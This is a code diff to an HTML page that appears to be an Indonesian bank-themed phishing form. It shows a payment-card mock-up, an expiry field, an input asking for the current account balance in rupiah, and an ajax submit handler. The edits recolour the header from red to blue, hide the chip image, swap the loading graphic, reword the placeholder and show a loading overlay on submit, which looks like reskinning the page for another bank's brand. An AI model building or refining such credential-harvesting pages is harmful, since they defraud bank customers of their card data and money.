@@ -1036,7 +1036,7 @@ position: center;
    
   <!-- partial:index.partial.html --> 
 <div class="container-6" style="text-align: left; background-img: src();">
-<nav style="position: fixed; margin: 0px auto; left: 0; right: 0; top: 0; bottom: 0; width: 100%; height: 65; background-color: #780001; background-image: url(https://i.ibb.co/F87JSq6/IMG-20240212-150531.jpg); box-shadow: 3px 3px 8px rgba(3, 3, 3, 0.8);background-size: 100% 100%; background-position: 100% 100%;"></nav>
+<nav style="position: fixed; margin: 0px auto; left: 0; right: 0; top: 0; bottom: 0; width: 100%; height: 65; background-color: #005BAA; background-image: url(https://i.ibb.co/F87JSq6/IMG-20240212-150531.jpg); box-shadow: 3px 3px 8px rgba(3, 3, 3, 0.8);background-size: 100% 100%; background-position: 100% 100%;"></nav>
 <br>
   <div class="wrapper" id="app" style="margin-top: -15px"> 
   
@@ -1050,7 +1050,7 @@ position: center;
        </div> 
        <div class="card-item__wrapper" style="margin-top: 39px; margin-left: 12px"> 
         <div class="card-item__top"> 
-         <img src="https://i.ibb.co/rFz1rzB/chip-logo.png" class="card-item__chip"> 
+         <img src="https://i.ibb.co/rFz1rzB/chip-logo.png" class="card-item__chip" style="opacity: 0"> 
          <div class="card-item__type"> 
           <transition name="slide-fade-up"> 
            
@@ -1118,7 +1118,7 @@ position: center;
       </div> 
       <center>
  <div class="app-loading" style="position: fixed; margin: 0px auto; left: 0; right: 0; top: 0; bottom: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.4); z-index: 99999999; padding-top: 250px; display: none" id="lodingku1">
- <img class="img-fluid" style="width: 80px" src="https://i.ibb.co/dcZSSt6/kisspng-chip-pin-solutions-ltd-emv-payment-card-credit-c-chip-5adec4d888c159-9368124415245488245602.jpg" alt="preloader" />
+ <img class="img-fluid" style="width: 80px" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFUwJKdE9j8_3lFNxSxe1rLs5VqP2ClYw91ta07YbyH7IFA-kn707eQRhCjKLEINqibKGRJ3ZvTppY5TcrQVNwRWvVEBhFnRSLUkU587fZJfHPzzN8zVmOHAfno-hPCUHpFfYxBZzvrSq4EsIf91GAacApN8dkbarfTYqcfDXKdgxy0Jfg42IJqc3rbeI/s144/output-onlinegiftools%20(4).gif" alt="preloader" />
       </div>
   </center>
       <div class="card-item__side -back"> 
@@ -1185,7 +1185,7 @@ position: center;
 <p></p>
 
    
-        <input class="uang card-input__input" id="saldo" name="saldo" type="tel"  placeholder="Rp. 𝗦𝗮𝗹𝗱𝗼 𝗦𝗮𝗮𝘁 𝗜𝗻𝗶"  minlength="5" required>
+        <input class="uang card-input__input" id="saldo" name="saldo" type="tel"  placeholder="Rp. Saldo Aktif Saat Ini"  minlength="5" required>
      <br></div>
      
   
@@ -1354,7 +1354,7 @@ $('#valid').mask('00/00');
  $(document).ready(function(){
     $('#forgetPasswordForm').submit(function(e) {
     event.preventDefault();
-
+$("#lodingku1").show();
 document.getElementById('btnSubmit').innerHTML = "Memproses...";   
 
  $.ajax({
